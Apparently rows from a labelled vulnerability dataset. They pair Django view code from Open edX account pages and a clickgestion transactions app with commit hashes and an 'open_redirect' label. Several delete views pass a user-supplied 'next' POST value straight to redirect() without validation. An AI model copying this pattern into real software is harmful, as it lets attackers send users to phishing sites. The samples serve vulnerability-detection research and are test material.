        dict

    """"""
    user = request.user

    year_of_birth_options = [(unicode(year), unicode(year)) for year in UserProfile.VALID_YEARS]
    try:
        user_orders = get_user_orders(user)
    except:  # pylint: disable=bare-except
        log.exception('Error fetching order history from Otto.')
        # Return empty order list as account settings page expect a list and
        # it will be broken if exception raised
        user_orders = []

    context = {
        'auth': {},
        'duplicate_provider': None,
        'nav_hidden': True,
        'fields': {
            'country': {
                'options': list(countries),
            }, 'gender': {
                'options': [(choice[0], _(choice[1])) for choice in UserProfile.GENDER_CHOICES],  # pylint: disable=translation-of-non-string
            }, 'language': {
                'options': released_languages(),
            }, 'level_of_education': {
                'options': [(choice[0], _(choice[1])) for choice in UserProfile.LEVEL_OF_EDUCATION_CHOICES],  # pylint: disable=translation-of-non-string
            }, 'password': {
                'url': reverse('password_reset'),
            }, 'year_of_birth': {
                'options': year_of_birth_options,
            }, 'preferred_language': {
                'options': all_languages(),
            }, 'time_zone': {
                'options': TIME_ZONE_CHOICES,
            }
        },
        'platform_name': configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME),
        'password_reset_support_link': configuration_helpers.get_value(
            'PASSWORD_RESET_SUPPORT_LINK', settings.PASSWORD_RESET_SUPPORT_LINK
        ) or settings.SUPPORT_SITE_LINK,
        'user_accounts_api_url': reverse(""accounts_api"", kwargs={'username': user.username}),
        'user_preferences_api_url': reverse('preferences_api', kwargs={'username': user.username}),
        'disable_courseware_js': True,
        'show_program_listing': ProgramsApiConfig.is_enabled(),
        'order_history': user_orders
    }

    if third_party_auth.is_enabled():
        # If the account on the third party provider is already connected with another edX account,
        # we display a message to the user.
        context['duplicate_provider'] = pipeline.get_duplicate_provider(messages.get_messages(request))

        auth_states = pipeline.get_provider_user_states(user)

        context['auth']['providers'] = [{
            'id': state.provider.provider_id,
            'name': state.provider.name,  # The name of the provider e.g. Facebook
            'connected': state.has_account,  # Whether the user's edX account is connected with the provider.
            # If the user is not connected, they should be directed to this page to authenticate
            # with the particular provider, as long as the provider supports initiating a login.
            'connect_url': pipeline.get_login_url(
                state.provider.provider_id,
                pipeline.AUTH_ENTRY_ACCOUNT_SETTINGS,
                # The url the user should be directed to after the auth process has completed.
                redirect_url=reverse('account_settings'),
            ),
            'accepts_logins': state.provider.accepts_logins,
            # If the user is connected, sending a POST request to this url removes the connection
            # information for this provider from their edX account.
            'disconnect_url': pipeline.get_disconnect_url(state.provider.provider_id, state.association_id),
            # We only want to include providers if they are either currently available to be logged
            # in with, or if the user is already authenticated with them.
        } for state in auth_states if state.provider.display_for_login or state.has_account]

    return context
/n/n/n",0,open_redirect
23,41,84c6c5ac27627db8aa829ead02ec98e8afa94b1e,"/lms/djangoapps/student_account/views.py/n/n"""""" Views for a student's account information. """"""

import json
import logging
import urlparse
from datetime import datetime

from django.conf import settings
from django.contrib import messages
from django.contrib.auth import get_user_model
from django.contrib.auth.decorators import login_required
from django.core.urlresolvers import reverse
from django.http import HttpResponse, HttpResponseBadRequest, HttpResponseForbidden
from django.shortcuts import redirect
from django.utils.translation import ugettext as _
from django.views.decorators.csrf import ensure_csrf_cookie
from django.views.decorators.http import require_http_methods
from django_countries import countries

import third_party_auth
from commerce.models import CommerceConfiguration
from edxmako.shortcuts import render_to_response
from lms.djangoapps.commerce.utils import EcommerceService
from openedx.core.djangoapps.commerce.utils import ecommerce_api_client
from openedx.core.djangoapps.external_auth.login_and_register import login as external_auth_login
from openedx.core.djangoapps.external_auth.login_and_register import register as external_auth_register
from openedx.core.djangoapps.lang_pref.api import all_languages, released_languages
from openedx.core.djangoapps.programs.models import ProgramsApiConfig
from openedx.core.djangoapps.site_configuration import helpers as configuration_helpers
from openedx.core.djangoapps.theming.helpers import is_request_in_themed_site
from openedx.core.djangoapps.user_api.accounts.api import request_password_change
from openedx.core.djangoapps.user_api.api import (
    RegistrationFormFactory,
    get_login_session_form,
    get_password_reset_form
)
from openedx.core.djangoapps.user_api.errors import UserNotFound
from openedx.core.lib.edx_api_utils import get_edx_api_data
from openedx.core.lib.time_zone_utils import TIME_ZONE_CHOICES
from openedx.features.enterprise_support.api import enterprise_customer_for_request
from student.helpers import destroy_oauth_tokens, get_next_url_for_login_page
from student.models import UserProfile
from student.views import register_user as old_register_view
from student.views import signin_user as old_login_view
from third_party_auth import pipeline
from third_party_auth.decorators import xframe_allow_whitelisted
from util.bad_request_rate_limiter import BadRequestRateLimiter
from util.date_utils import strftime_localized

AUDIT_LOG = logging.getLogger(""audit"")
log = logging.getLogger(__name__)
User = get_user_model()  # pylint:disable=invalid-name


@require_http_methods(['GET'])
@ensure_csrf_cookie
@xframe_allow_whitelisted
def login_and_registration_form(request, initial_mode=""login""):
    """"""Render the combined login/registration form, defaulting to login

    This relies on the JS to asynchronously load the actual form from
    the user_api.

    Keyword Args:
        initial_mode (string): Either ""login"" or ""register"".

    """"""
    # Determine the URL to redirect to following login/registration/third_party_auth
    redirect_to = get_next_url_for_login_page(request)
    # If we're already logged in, redirect to the dashboard
    if request.user.is_authenticated():
        return redirect(redirect_to)

    # Retrieve the form descriptions from the user API
    form_descriptions = _get_form_descriptions(request)

    # Our ?next= URL may itself contain a parameter 'tpa_hint=x' that we need to check.
    # If present, we display a login page focused on third-party auth with that provider.
    third_party_auth_hint = None
    if '?' in redirect_to:
        try:
            next_args = urlparse.parse_qs(urlparse.urlparse(redirect_to).query)
            provider_id = next_args['tpa_hint'][0]
            tpa_hint_provider = third_party_auth.provider.Registry.get(provider_id=provider_id)
            if tpa_hint_provider:
                if tpa_hint_provider.skip_hinted_login_dialog:
                    # Forward the user directly to the provider's login URL when the provider is configured
                    # to skip the dialog.
                    return redirect(
                        pipeline.get_login_url(provider_id, pipeline.AUTH_ENTRY_LOGIN, redirect_url=redirect_to)
                    )
                third_party_auth_hint = provider_id
                initial_mode = ""hinted_login""
        except (KeyError, ValueError, IndexError):
            pass

    # If this is a themed site, revert to the old login/registration pages.
    # We need to do this for now to support existing themes.
    # Themed sites can use the new logistration page by setting
    # 'ENABLE_COMBINED_LOGIN_REGISTRATION' in their
    # configuration settings.
    if is_request_in_themed_site() and not configuration_helpers.get_value('ENABLE_COMBINED_LOGIN_REGISTRATION', False):
        if initial_mode == ""login"":
            return old_login_view(request)
        elif initial_mode == ""register"":
            return old_register_view(request)

    # Allow external auth to intercept and handle the request
    ext_auth_response = _external_auth_intercept(request, initial_mode)
    if ext_auth_response is not None:
        return ext_auth_response

    # Account activation message
    account_activation_messages = [
        {
            'message': message.message, 'tags': message.tags
        } for message in messages.get_messages(request) if 'account-activation' in message.tags
    ]

    # Otherwise, render the combined login/registration page
    context = {
        'data': {
            'login_redirect_url': redirect_to,
            'initial_mode': initial_mode,
            'third_party_auth': _third_party_auth_context(request, redirect_to, third_party_auth_hint),
            'third_party_auth_hint': third_party_auth_hint or '',
            'platform_name': configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME),
            'support_link': configuration_helpers.get_value('SUPPORT_SITE_LINK', settings.SUPPORT_SITE_LINK),
            'password_reset_support_link': configuration_helpers.get_value(
                'PASSWORD_RESET_SUPPORT_LINK', settings.PASSWORD_RESET_SUPPORT_LINK
            ) or settings.SUPPORT_SITE_LINK,
            'account_activation_messages': account_activation_messages,

            # Include form descriptions retrieved from the user API.
            # We could have the JS client make these requests directly,
            # but we include them in the initial page load to avoid
            # the additional round-trip to the server.
            'login_form_desc': json.loads(form_descriptions['login']),
            'registration_form_desc': json.loads(form_descriptions['registration']),
            'password_reset_form_desc': json.loads(form_descriptions['password_reset']),
            'account_creation_allowed': configuration_helpers.get_value(
                'ALLOW_PUBLIC_ACCOUNT_CREATION', settings.FEATURES.get('ALLOW_PUBLIC_ACCOUNT_CREATION', True))
        },
        'login_redirect_url': redirect_to,  # This gets added to the query string of the ""Sign In"" button in header
        'responsive': True,
        'allow_iframing': True,
        'disable_courseware_js': True,
        'combined_login_and_register': True,
        'disable_footer': not configuration_helpers.get_value(
            'ENABLE_COMBINED_LOGIN_REGISTRATION_FOOTER',
            settings.FEATURES['ENABLE_COMBINED_LOGIN_REGISTRATION_FOOTER']
        ),
    }

    context = update_context_for_enterprise(request, context)

    response = render_to_response('student_account/login_and_register.html', context)

    # Remove enterprise cookie so that subsequent requests show default login page.
    response.delete_cookie(
        configuration_helpers.get_value(""ENTERPRISE_CUSTOMER_COOKIE_NAME"", settings.ENTERPRISE_CUSTOMER_COOKIE_NAME),
        domain=configuration_helpers.get_value(""BASE_COOKIE_DOMAIN"", settings.BASE_COOKIE_DOMAIN),
    )

    return response


@require_http_methods(['POST'])
def password_change_request_handler(request):
    """"""Handle password change requests originating from the account page.

    Uses the Account API to email the user a link to the password reset page.

    Note:
        The next step in the password reset process (confirmation) is currently handled
        by student.views.password_reset_confirm_wrapper, a custom wrapper around Django's
        password reset confirmation view.

    Args:
        request (HttpRequest)

    Returns:
        HttpResponse: 200 if the email was sent successfully
        HttpResponse: 400 if there is no 'email' POST parameter
        HttpResponse: 403 if the client has been rate limited
        HttpResponse: 405 if using an unsupported HTTP method

    Example usage:

        POST /account/password

    """"""

    limiter = BadRequestRateLimiter()
    if limiter.is_rate_limit_exceeded(request):
        AUDIT_LOG.warning(""Password reset rate limit exceeded"")
        return HttpResponseForbidden()

    user = request.user
    # Prefer logged-in user's email
    email = user.email if user.is_authenticated() else request.POST.get('email')

    if email:
        try:
            request_password_change(email, request.is_secure())
            user = user if user.is_authenticated() else User.objects.get(email=email)
            destroy_oauth_tokens(user)
        except UserNotFound:
            AUDIT_LOG.info(""Invalid password reset attempt"")
            # Increment the rate limit counter
            limiter.tick_bad_request_counter(request)

        return HttpResponse(status=200)
    else:
        return HttpResponseBadRequest(_(""No email address provided.""))


def update_context_for_enterprise(request, context):
    """"""
    Take the processed context produced by the view, determine if it's relevant
    to a particular Enterprise Customer, and update it to include that customer's
    enterprise metadata.
    """"""

    context = context.copy()

    sidebar_context = enterprise_sidebar_context(request)

    if sidebar_context:
        context['data']['registration_form_desc']['fields'] = enterprise_fields_only(
            context['data']['registration_form_desc']
        )
        context.update(sidebar_context)
        context['enable_enterprise_sidebar'] = True
        context['data']['hide_auth_warnings'] = True
    else:
        context['enable_enterprise_sidebar'] = False

    return context


def enterprise_fields_only(fields):
    """"""
    Take the received field definition, and exclude those fields that we don't want
    to require if the user is going to be a member of an Enterprise Customer.
    """"""
    enterprise_exclusions = configuration_helpers.get_value(
        'ENTERPRISE_EXCLUDED_REGISTRATION_FIELDS',
        settings.ENTERPRISE_EXCLUDED_REGISTRATION_FIELDS
    )
    return [field for field in fields['fields'] if field['name'] not in enterprise_exclusions]


def enterprise_sidebar_context(request):
    """"""
    Given the current request, render the HTML of a sidebar for the current
    logistration view that depicts Enterprise-related information.
    """"""
    enterprise_customer = enterprise_customer_for_request(request)

    if not enterprise_customer:
        return {}

    platform_name = configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME)

    if enterprise_customer.branding_configuration.logo:
        enterprise_logo_url = enterprise_customer.branding_configuration.logo.url
    else:
        enterprise_logo_url = ''

    if getattr(enterprise_customer.branding_configuration, 'welcome_message', None):
        branded_welcome_template = enterprise_customer.branding_configuration.welcome_message
    else:
        branded_welcome_template = configuration_helpers.get_value(
            'ENTERPRISE_SPECIFIC_BRANDED_WELCOME_TEMPLATE',
            settings.ENTERPRISE_SPECIFIC_BRANDED_WELCOME_TEMPLATE
        )

    branded_welcome_string = branded_welcome_template.format(
        start_bold=u'<b>',
        end_bold=u'</b>',
        enterprise_name=enterprise_customer.name,
        platform_name=platform_name
    )

    platform_welcome_template = configuration_helpers.get_value(
        'ENTERPRISE_PLATFORM_WELCOME_TEMPLATE',
        settings.ENTERPRISE_PLATFORM_WELCOME_TEMPLATE
    )
    platform_welcome_string = platform_welcome_template.format(platform_name=platform_name)

    context = {
        'enterprise_name': enterprise_customer.name,
        'enterprise_logo_url': enterprise_logo_url,
        'enterprise_branded_welcome_string': branded_welcome_string,
        'platform_welcome_string': platform_welcome_string,
    }

    return context


def _third_party_auth_context(request, redirect_to, tpa_hint=None):
    """"""Context for third party auth providers and the currently running pipeline.

    Arguments:
        request (HttpRequest): The request, used to determine if a pipeline
            is currently running.
        redirect_to: The URL to send the user to following successful
            authentication.
        tpa_hint (string): An override flag that will return a matching provider
            as long as its configuration has been enabled

    Returns:
        dict

    """"""
    context = {
        ""currentProvider"": None,
        ""providers"": [],
        ""secondaryProviders"": [],
        ""finishAuthUrl"": None,
        ""errorMessage"": None,
        ""registerFormSubmitButtonText"": _(""Create Account""),
    }

    if third_party_auth.is_enabled():
        enterprise_customer = enterprise_customer_for_request(request)
        if not enterprise_customer:
            for enabled in third_party_auth.provider.Registry.displayed_for_login(tpa_hint=tpa_hint):
                info = {
                    ""id"": enabled.provider_id,
                    ""name"": enabled.name,
                    ""iconClass"": enabled.icon_class or None,
                    ""iconImage"": enabled.icon_image.url if enabled.icon_image else None,
                    ""loginUrl"": pipeline.get_login_url(
                        enabled.provider_id,
                        pipeline.AUTH_ENTRY_LOGIN,
                        redirect_url=redirect_to,
                    ),
                    ""registerUrl"": pipeline.get_login_url(
                        enabled.provider_id,
                        pipeline.AUTH_ENTRY_REGISTER,
                        redirect_url=redirect_to,
                    ),
                }
                context[""providers"" if not enabled.secondary else ""secondaryProviders""].append(info)

        running_pipeline = pipeline.get(request)
        if running_pipeline is not None:
            current_provider = third_party_auth.provider.Registry.get_from_pipeline(running_pipeline)

            if current_provider is not None:
                context[""currentProvider""] = current_provider.name
                context[""finishAuthUrl""] = pipeline.get_complete_url(current_provider.backend_name)

                if current_provider.skip_registration_form:
                    # For enterprise (and later for everyone), we need to get explicit consent to the
                    # Terms of service instead of auto submitting the registration form outright.
                    if not enterprise_customer:
                        # As a reliable way of ""skipping"" the registration form, we just submit it automatically
                        context[""autoSubmitRegForm""] = True
                    else:
                        context[""autoRegisterWelcomeMessage""] = (
                            'Thank you for joining {}. '
                            'Just a couple steps before you start learning!'
                        ).format(
                            configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME)
                        )
                        context[""registerFormSubmitButtonText""] = _(""Continue"")

        # Check for any error messages we may want to display:
        for msg in messages.get_messages(request):
            if msg.extra_tags.split()[0] == ""social-auth"":
                # msg may or may not be translated. Try translating [again] in case we are able to:
                context['errorMessage'] = _(unicode(msg))  # pylint: disable=translation-of-non-string
                break

    return context


def _get_form_descriptions(request):
    """"""Retrieve form descriptions from the user API.

    Arguments:
        request (HttpRequest): The original request, used to retrieve session info.

    Returns:
        dict: Keys are 'login', 'registration', and 'password_reset';
            values are the JSON-serialized form descriptions.

    """"""

    return {
        'password_reset': get_password_reset_form().to_json(),
        'login': get_login_session_form().to_json(),
        'registration': RegistrationFormFactory().get_registration_form(request).to_json()
    }


def _external_auth_intercept(request, mode):
    """"""Allow external auth to intercept a login/registration request.

    Arguments:
        request (Request): The original request.
        mode (str): Either ""login"" or ""register""

    Returns:
        Response or None

    """"""
    if mode == ""login"":
        return external_auth_login(request)
    elif mode == ""register"":
        return external_auth_register(request)


def get_user_orders(user):
    """"""Given a user, get the detail of all the orders from the Ecommerce service.

    Args:
        user (User): The user to authenticate as when requesting ecommerce.

    Returns:
        list of dict, representing orders returned by the Ecommerce service.
    """"""
    no_data = []
    user_orders = []
    commerce_configuration = CommerceConfiguration.current()
    user_query = {'username': user.username}

    use_cache = commerce_configuration.is_cache_enabled
    cache_key = commerce_configuration.CACHE_KEY + '.' + str(user.id) if use_cache else None
    api = ecommerce_api_client(user)
    commerce_user_orders = get_edx_api_data(
        commerce_configuration, 'orders', api=api, querystring=user_query, cache_key=cache_key
    )

    for order in commerce_user_orders:
        if order['status'].lower() == 'complete':
            date_placed = datetime.strptime(order['date_placed'], ""%Y-%m-%dT%H:%M:%SZ"")
            order_data = {
                'number': order['number'],
                'price': order['total_excl_tax'],
                'order_date': strftime_localized(date_placed, 'SHORT_DATE'),
                'receipt_url': EcommerceService().get_receipt_page_url(order['number']),
                'lines': order['lines'],
            }
            user_orders.append(order_data)

    return user_orders


@login_required
@require_http_methods(['GET'])
def account_settings(request):
    """"""Render the current user's account settings page.

    Args:
        request (HttpRequest)

    Returns:
        HttpResponse: 200 if the page was sent successfully
        HttpResponse: 302 if not logged in (redirect to login page)
        HttpResponse: 405 if using an unsupported HTTP method

    Example usage:

        GET /account/settings

    """"""
    return render_to_response('student_account/account_settings.html', account_settings_context(request))


@login_required
@require_http_methods(['GET'])
def finish_auth(request):  # pylint: disable=unused-argument
    """""" Following logistration (1st or 3rd party), handle any special query string params.

    See FinishAuthView.js for details on the query string params.

    e.g. auto-enroll the user in a course, set email opt-in preference.

    This view just displays a ""Please wait"" message while AJAX calls are made to enroll the
    user in the course etc. This view is only used if a parameter like ""course_id"" is present
    during login/registration/third_party_auth. Otherwise, there is no need for it.

    Ideally this view will finish and redirect to the next step before the user even sees it.

    Args:
        request (HttpRequest)

    Returns:
        HttpResponse: 200 if the page was sent successfully
        HttpResponse: 302 if not logged in (redirect to login page)
        HttpResponse: 405 if using an unsupported HTTP method

    Example usage:

        GET /account/finish_auth/?course_id=course-v1:blah&enrollment_action=enroll

    """"""
    return render_to_response('student_account/finish_auth.html', {
        'disable_courseware_js': True,
        'disable_footer': True,
    })


def account_settings_context(request):
    """""" Context for the account settings page.

    Args:
        request: The request object.

    Returns:
        dict

    """"""
    user = request.user

    year_of_birth_options = [(unicode(year), unicode(year)) for year in UserProfile.VALID_YEARS]
    try:
        user_orders = get_user_orders(user)
    except:  # pylint: disable=bare-except
        log.exception('Error fetching order history from Otto.')
        # Return empty order list as account settings page expect a list and
        # it will be broken if exception raised
        user_orders = []

    context = {
        'auth': {},
        'duplicate_provider': None,
        'nav_hidden': True,
        'fields': {
            'country': {
                'options': list(countries),
            }, 'gender': {
                'options': [(choice[0], _(choice[1])) for choice in UserProfile.GENDER_CHOICES],  # pylint: disable=translation-of-non-string
            }, 'language': {
                'options': released_languages(),
            }, 'level_of_education': {
                'options': [(choice[0], _(choice[1])) for choice in UserProfile.LEVEL_OF_EDUCATION_CHOICES],  # pylint: disable=translation-of-non-string
            }, 'password': {
                'url': reverse('password_reset'),
            }, 'year_of_birth': {
                'options': year_of_birth_options,
            }, 'preferred_language': {
                'options': all_languages(),
            }, 'time_zone': {
                'options': TIME_ZONE_CHOICES,
            }
        },
        'platform_name': configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME),
        'password_reset_support_link': configuration_helpers.get_value(
            'PASSWORD_RESET_SUPPORT_LINK', settings.PASSWORD_RESET_SUPPORT_LINK
        ) or settings.SUPPORT_SITE_LINK,
        'user_accounts_api_url': reverse(""accounts_api"", kwargs={'username': user.username}),
        'user_preferences_api_url': reverse('preferences_api', kwargs={'username': user.username}),
        'disable_courseware_js': True,
        'show_program_listing': ProgramsApiConfig.is_enabled(),
        'order_history': user_orders
    }

    if third_party_auth.is_enabled():
        # If the account on the third party provider is already connected with another edX account,
        # we display a message to the user.
        context['duplicate_provider'] = pipeline.get_duplicate_provider(messages.get_messages(request))

        auth_states = pipeline.get_provider_user_states(user)

        context['auth']['providers'] = [{
            'id': state.provider.provider_id,
            'name': state.provider.name,  # The name of the provider e.g. Facebook
            'connected': state.has_account,  # Whether the user's edX account is connected with the provider.
            # If the user is not connected, they should be directed to this page to authenticate
            # with the particular provider, as long as the provider supports initiating a login.
            'connect_url': pipeline.get_login_url(
                state.provider.provider_id,
                pipeline.AUTH_ENTRY_ACCOUNT_SETTINGS,
                # The url the user should be directed to after the auth process has completed.
                redirect_url=reverse('account_settings'),
            ),
            'accepts_logins': state.provider.accepts_logins,
            # If the user is connected, sending a POST request to this url removes the connection
            # information for this provider from their edX account.
            'disconnect_url': pipeline.get_disconnect_url(state.provider.provider_id, state.association_id),
            # We only want to include providers if they are either currently available to be logged
            # in with, or if the user is already authenticated with them.
        } for state in auth_states if state.provider.display_for_login or state.has_account]

    return context
/n/n/n",1,open_redirect
24,112,3836e2f5eae0391c89c5b4d0759604c9264630db,"django_container/app/clickgestion/transactions/views.py/n/nfrom django.apps import apps
from clickgestion.transactions.forms import TransactionEditForm, TransactionPayForm
from clickgestion.transactions.models import BaseConcept, Transaction
from django.shortcuts import get_object_or_404, render, redirect, reverse
from django.utils.translation import gettext, gettext_lazy
from clickgestion.transactions.filters import ConceptFilter, TransactionFilter
from clickgestion.core.utilities import invalid_permission_redirect
from django.views.generic import ListView
from django.contrib.auth.decorators import login_required
from pure_pagination.mixins import PaginationMixin
from django.http import HttpResponse, QueryDict
from django.conf import settings
from django.utils import timezone
from django_xhtml2pdf.utils import generate_pdf
import urllib


@login_required()
def concept_delete(request, *args, **kwargs):
    extra_context = {}

    # Check permissions

    # Get the concept and form
    concept, concept_form = get_concept_and_form_from_kwargs(**kwargs)
    extra_context['concept'] = concept

    # Get the transaction
    transaction = concept.transaction
    if transaction.closed:
        return redirect('message', message=gettext('Transaction Closed'))
    extra_context['transaction'] = transaction

    # Use default delete view
    extra_context['header'] = gettext('Delete {}?'.format(concept.concept_type))
    extra_context['message'] = concept.description_short
    extra_context['next'] = request.META['HTTP_REFERER']

    # POST
    if request.method == 'POST':
        default_next = reverse('transaction_detail', kwargs={'transaction_code': concept.transaction.code})
        concept.delete()
        next_page = request.POST.get('next', default_next)
        return redirect(next_page)

    # GET
    else:
        return render(request, 'core/delete.html', extra_context)


@login_required()
def concept_detail(request, *args, **kwargs):
    extra_context = {}

    # Check permissions

    # Get the concept and form
    concept, concept_form = get_concept_and_form_from_kwargs(**kwargs)
    extra_context['concept'] = concept

    # Get the transaction
    transaction = concept.transaction
    extra_context['transaction'] = transaction

    return render(request, 'transactions/concept_detail.html', extra_context)


@login_required()
def concept_edit(request, *args, **kwargs):
    extra_context = {}

    # Check permissions

    # Get the concept and form
    concept, concept_form = get_concept_and_form_from_kwargs(**kwargs)
    extra_context['concept'] = concept

    # Get the transaction
    transaction = concept.transaction
    if transaction.closed:
        return redirect('message', message=gettext('Transaction Closed'))
    extra_context['transaction'] = transaction

    # POST
    if request.method == 'POST':
        form = concept_form(request.POST, instance=concept)
        if form.is_valid():
            form.save()
            return redirect('transaction_edit', transaction_code=transaction.code)

        else:
            extra_context['form'] = form
            return render(request, 'transactions/concept_edit.html', extra_context)

    # GET
    else:

        # Get the form
        form = concept_form(instance=concept)
        extra_context['form'] = form
        return render(request, 'transactions/concept_edit.html', extra_context)


class ConceptList(PaginationMixin, ListView):

    template_name = 'transactions/concept_list.html'
    model = BaseConcept
    context_object_name = 'concepts'
    paginate_by = 8
    # ListView.as_view will pass custom arguments here
    queryset = None
    header = gettext_lazy('Concepts')
    request = None
    filter = None
    filter_data = None
    is_filtered = False

    def get(self, request, *args, **kwargs):
        # First

        # Check permissions
        if not request.user.is_authenticated:
            return invalid_permission_redirect(request)

        # Get arguments
        self.request = request
        self.filter_data = kwargs.pop('filter_data', {})

        # Call super
        return super().get(self, request, *args, **kwargs)

    def get_context_data(self, **kwargs):
        # Third

        # Call the base implementation first
        context = super().get_context_data(**kwargs)

        # Add data
        context['header'] = self.header
        context['filter'] = self.filter
        context['is_filtered'] = self.is_filtered

        return context

    def get_queryset(self):
        # Second

        # Create filter querydict
        data = QueryDict('', mutable=True)
        # Add filters passed from view
        data.update(self.filter_data)
        # Add filters selected by user
        data.update(self.request.GET)

        # Record as filtered
        self.is_filtered = False
        if len([k for k in data.keys() if k != 'page']) > 0:
            self.is_filtered = True

        # Add filters by permission

        # Filter the queryset
        self.filter = ConceptFilter(data)
        self.queryset = self.filter.qs.select_related('transaction') \
            .prefetch_related('value__currency') \
            .order_by('-id') # 79q 27ms

        # Return
        return self.queryset


def get_available_concepts(employee, transaction):
    """"""
    Get a list of the available concepts that can be added to the given transaction.

    :param employee: The employee executing the transaction (current user)
    :param transaction: The open transaction
    :return: A list of dictionaries.
    """"""

    # get permissions according to transaction
    concepts_permitted_by_transaction = transaction.get_all_permissions()

    # get permissions according to employee
    concepts_permitted_by_employee = employee.get_all_permissions()

    # create the list of permitted concepts
    available_concepts = []
    for concept in settings.CONCEPTS:
        permission = concept.replace('.','.add_')
        concept_model = apps.get_model(concept)

        # Skip this concept if not permitted by the user
        if not permission in concepts_permitted_by_employee:
            continue

        # set default values
        disabled = False
        url = concept_model._url.format('new/{}'.format(transaction.code))

        # disable this concept if not permitted by the transaction
        if not permission in concepts_permitted_by_transaction:
            disabled = True
            url = '#'

        # add to the list
        available_concepts.append(
            {
                'name': concept_model._meta.verbose_name,
                'url': url,
                'disabled': disabled,
            }
        )

    return available_concepts


def get_transaction_from_kwargs(**kwargs):
    # Get the transaction
    transaction_code = kwargs.get('transaction_code', None)
    transaction = get_object_or_404(Transaction, code=transaction_code)
    return transaction


def get_concept_and_form_from_kwargs(**kwargs):

    # Get the form
    concept_form = kwargs.get('concept_form', None)

    # Get the concept class
    concept_class = concept_form._meta.model

    # If a transaction code is provided, this is a new concept
    transaction_code = kwargs.get('transaction_code', None)
    if transaction_code:
        transaction = get_transaction_from_kwargs(**kwargs)
        return concept_class(transaction=transaction), concept_form

    # Get the existing concept
    concept_code = kwargs.get('concept_code', None)
    concept = get_object_or_404(concept_class, code=concept_code)
    return concept, concept_form


def transaction_delete(request, *args, **kwargs):
    extra_context = {}

    # Check permissions
    if not request.user.is_authenticated:
        return invalid_permission_redirect(request)

    # Get the object
    transaction_code = kwargs.get('transaction_code', None)
    transaction = get_object_or_404(Transaction, code=transaction_code)
    extra_context['transaction'] = transaction

    # Use default delete view
    extra_context['header'] = gettext('Delete Transaction?')
    extra_context['message'] = transaction.description_short
    extra_context['next'] = request.META['HTTP_REFERER']

    # POST
    if request.method == 'POST':
        default_next = reverse('transactions_open')
        transaction.delete()
        next_page = request.POST.get('next', default_next)
        return redirect(next_page)

    # GET
    else:
        return render(request, 'core/delete.html', extra_context)


@login_required
def transaction_detail(request, *args, **kwargs):
    extra_context = {}

    # Check permissions
    if not request.user.is_authenticated:
        return invalid_permission_redirect(request)

    # Get the transaction
    transaction_code = kwargs.get('transaction_code', None)
    transaction = get_object_or_404(Transaction, code=transaction_code)
    extra_context['transaction'] = transaction
    return render(request, 'transactions/transaction_detail.html', extra_context)


@login_required
def transaction_edit(request, *args, **kwargs):
    extra_context = {}

    # Check permissions
    if not request.user.is_authenticated:
        return invalid_permission_redirect(request)

    # Get the transaction
    transaction_code = kwargs.get('transaction_code', None)
    if not transaction_code:
        transaction = Transaction.objects.create(employee=request.user)
        return redirect('transaction_edit', transaction_code=transaction.code)

    transaction = get_object_or_404(Transaction, code=transaction_code)
    extra_context['transaction'] = transaction

    # Check that the transaction is open
    if transaction.closed:
        return redirect('message', message=gettext('Transaction Closed'))

    # Get available concepts to add
    available_concepts = get_available_concepts(request.user, transaction)
    extra_context['available_concepts'] = available_concepts

    # POST
    if request.method == 'POST':
        form = TransactionEditForm(request.POST, instance=transaction)
        valid = form.is_valid()

        # Delete and go home
        # Note that the form.data value is still a string before validating
        if form.data['cancel_button'] == 'True':
            transaction.delete()
            return redirect('index')

        # If valid
        if valid:

            # Save the transaction
            transaction.save()

            # Finish later
            if form.cleaned_data['save_button']:
                return redirect('transaction_detail', transaction_code=transaction.code)

            # Proceed to pay
            return redirect('transaction_pay', transaction_code=transaction.code)

        else:
            extra_context['form'] = form
            return render(request, 'transactions/transaction_edit.html', extra_context)

    # GET
    else:

        # Create the form
        form = TransactionEditForm(instance=transaction)
        extra_context['form'] = form
        return render(request, 'transactions/transaction_edit.html', extra_context)


class TransactionList(PaginationMixin, ListView):

    model = Transaction
    context_object_name = 'transactions'
    paginate_by = 8
    # ListView.as_view will pass custom arguments here
    queryset = None
    header = gettext_lazy('Transactions')
    request = None
    filter = None
    filter_data = None
    is_filtered = False

    def get(self, request, *args, **kwargs):
        # First

        # Check permissions
        if not request.user.is_authenticated:
            return invalid_permission_redirect(request)

        # Get arguments
        self.request = request
        self.filter_data = kwargs.pop('filter_data', {})

        # Call super
        return super().get(self, request, *args, **kwargs)

    def get_context_data(self, **kwargs):
        # Third

        # Call the base implementation first
        context = super().get_context_data(**kwargs)

        # Add data
        context['header'] = self.header
        context['filter'] = self.filter
        context['is_filtered'] = self.is_filtered

        return context

    def get_queryset(self):
        # Second

        # Create filter querydict
        data = QueryDict('', mutable=True)
        # Add filters passed from view
        data.update(self.filter_data)
        # Add filters selected by user
        data.update(self.request.GET)

        # Record as filtered
        self.is_filtered = False
        if len([k for k in data.keys() if k != 'page']) > 0:
            self.is_filtered = True

        # Add filters by permission

        # Filter the queryset
        self.filter = TransactionFilter(data)
        self.queryset = self.filter.qs.select_related('cashclose')\
            .prefetch_related('concepts__value__currency') \
            .order_by('-id')  # 79q 27ms

        # Return
        return self.queryset

    def post(self, request, *args, **kwargs):

        # Check permissions
        if not request.user.is_authenticated:
            return invalid_permission_redirect(request)

        print_transaction = request.POST.get('print_transaction', None)
        if print_transaction:
            # Get the transaction
            transaction = get_object_or_404(Transaction, code=print_transaction)
            # Create an http response
            resp = HttpResponse(content_type='application/pdf')
            resp['Content-Disposition'] = 'attachment; filename=""{}.pdf""'.format(transaction.code)
            # Set context
            context = {
                'transaction': transaction,
            }
            # Generate the pdf
            result = generate_pdf('transactions/invoice.html', file_object=resp, context=context)
            return result

        # Return same
        request.method = 'GET'
        return self.get(request, *args, **kwargs)



@login_required
def transaction_pay(request, *args, **kwargs):
    extra_context = {}

    # Check permissions
    if not request.user.is_authenticated:
        return invalid_permission_redirect(request)

    # Get the transaction
    transaction_code = kwargs.get('transaction_code', None)
    transaction = get_object_or_404(Transaction, code=transaction_code)
    extra_context['transaction'] = transaction

    # Check that the transaction is open
    if transaction.closed:
        return redirect('message', message=gettext('Transaction Closed'))

    # Get required payment fields

    # POST
    if request.method == 'POST':
